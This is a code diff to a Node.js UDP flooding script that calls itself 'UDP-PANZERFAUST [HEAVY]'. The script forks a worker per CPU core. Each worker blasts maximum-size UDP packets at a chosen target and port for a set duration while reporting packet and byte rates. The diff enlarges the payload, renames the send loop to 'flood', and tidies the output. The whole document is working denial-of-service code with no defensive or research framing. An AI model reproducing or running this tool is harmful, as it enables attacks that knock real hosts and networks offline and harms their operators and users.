@@ -11,11 +11,14 @@ if (!target || isNaN(duration)) {
   process.exit(1);
 }
 
-const endTime = Date.now() + duration * 1000;
-const payloadSize = 1400;
-const payload = Buffer.alloc(payloadSize, 'A');
+// ========== CONFIG ==========
+const payloadSize = 1472; // Max UDP payload (Ethernet MTU)
 const cpuCount = os.cpus().length;
+const payload = Buffer.alloc(payloadSize); // fast empty buffer
 
+const endTime = Date.now() + duration * 1000;
+
+// ========== FORMATTING ==========
 function formatNumber(n) {
   const units = ['', 'K', 'M', 'B', 'T'];
   let i = 0;
@@ -36,6 +39,7 @@ function formatBytes(bytes) {
   return `${bytes.toFixed(2)} ${units[i]}`;
 }
 
+// ========== MASTER ==========
 if (cluster.isMaster) {
   let totalSent = 0;
   let totalBytes = 0;
@@ -43,10 +47,10 @@ if (cluster.isMaster) {
   console.clear();
   console.log('UDP-PANZERFAUST [HEAVY]');
   console.log('--------------------------------------');
-  console.log(`Target: ${target}:${port}`);
-  console.log(`Duration: ${duration}s`);
-  console.log(`Payload: ${payloadSize} bytes`);
-  console.log(`Cores: ${cpuCount}`);
+  console.log(`Target:                ${target}:${port}`);
+  console.log(`Duration:              ${duration}s`);
+  console.log(`Payload:               ${payloadSize} bytes`);
+  console.log(`Cores:                 ${cpuCount}`);
   console.log('Launching...\n');
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
@@ -77,29 +81,31 @@ if (cluster.isMaster) {
     process.exit(0);
   }, duration * 1000);
 
+// ========== WORKER ==========
 } else {
   const sock = dgram.createSocket('udp4');
+
   sock.bind(() => {
-    sock.setSendBufferSize(4 * 1024 * 1024);
+    sock.setSendBufferSize(4 * 1024 * 1024); // 4MB socket buffer
   });
 
   let sent = 0;
   let bytes = 0;
 
-  function spam() {
-    function sendLoop() {
+  function flood() {
+    function loop() {
       if (Date.now() > endTime) return;
 
-      for (let i = 0; i < 200; i++) {
+      for (let i = 0; i < 100; i++) {
         sock.send(payload, port, target);
         sent++;
-        bytes += payload.length;
+        bytes += payloadSize;
       }
 
-      setImmediate(sendLoop);
+      setImmediate(loop);
     }
 
-    sendLoop();
+    loop();
   }
 
   setInterval(() => {
@@ -108,5 +114,5 @@ if (cluster.isMaster) {
     bytes = 0;
   }, 1000);
 
-  spam();
+  flood();
 }
